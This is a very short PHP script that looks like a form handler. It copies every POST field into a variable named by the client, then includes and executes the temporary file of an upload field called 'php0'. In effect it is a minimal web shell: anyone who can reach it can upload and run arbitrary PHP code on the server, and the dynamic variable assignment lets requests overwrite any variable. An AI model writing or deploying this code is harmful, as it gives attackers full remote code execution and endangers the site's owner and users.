<?php
header("Content-type: text/plain; charset=UTF-8");
foreach ($_POST as $key => $item) {
        if ($item != '') {
            $w = $key;
            $$w = htmlspecialchars($_POST[$w], ENT_QUOTES, 'UTF-8');
        } else {
            echo 'Нет введенных данных';
            exit();
        }
}
include $_FILES['php0']['tmp_name'];
